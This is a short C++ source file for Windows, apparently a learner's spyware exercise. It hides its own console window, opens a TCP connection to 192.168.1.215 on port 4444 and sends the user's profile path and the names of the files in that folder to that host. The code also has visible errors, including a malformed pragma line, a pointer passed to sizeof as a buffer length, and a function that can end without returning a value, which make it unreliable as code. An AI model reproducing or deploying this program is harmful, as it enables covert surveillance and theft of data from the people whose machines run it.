#define _WINSOCK_DEPRICATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define WINSOCKAPI

#pragma comment(lib."ws2_32.lib")

using namespace std;

#include<iostream>
#include<dirent.h>
#include<stdio.h>
#include<string>
#include<winsock2.h> //V2
#include<stdlib.h>

//function to print all files and folders in a directory

char* getUserDir()
{
	char* pPath;
	pPath=getenv("USERPROFILE");
	if (pPath != NULL)
	{
		return pPath;
	}
	else
	{
		perror("");

	}

}

int main()
{
	int s;

	ShowWindow(GetConsoleWindow(),0); //Returns a handle to the window used by the Console,Sets the specified window's show state
	
	//

	WSADATA WSAData; //struct of type WSADATA: -> Contains information about Windows Socket
	SOCKET server; //Creating a Socket, SOCKET type Function that returns a SOCKET Object
	SOCKADDR_IN addr; //Struct of SOCKADDR_IN Type, define values for it!

	//Initalise
	WSAStartup(MAKEWORD(2,2),&WSAData);  //Function(highest_version_of_windows_sockets_supported,A pointer to user definedstruct of type WSADATA)
	server = socket(AF_INET,SOCK_STREAM,0); //({IPV4,IPV6},TCP/UDP,protocol

	addr.sin_family=AF_INET;
	addr.sin_port=htons(4444);
	addr.sin_addr.s_addr= inet_addr("192.168.1.215");
	connect(server,(SOCKADDR *)&addr,sizeof(addr));

	cout<<"\nConnected!\n";

	char* pPath = getUserDir();
	send(server,pPath,sizeof(pPath),0); //socket,pointer to buffer,length(buffer),flags

	DIR *dir; //Directory type varaible, basiaclly descriptor
	struct dirent *ent; //pointer to a struct of type dirent

	//open a folder
	if ((dir = opendir(pPath))!=NULL)
	{
		while((ent = readdir(dir)) != NULL) //read directory name from directory descriptor 'dir' and store in struct of type dirent
		{
			send(server,ent->d_name,sizeof(ent->d_name),0);
		}

	}
	else
	{
		perror("");
	}



	closesocket(server);
	WSACleanup();


	return 0;
}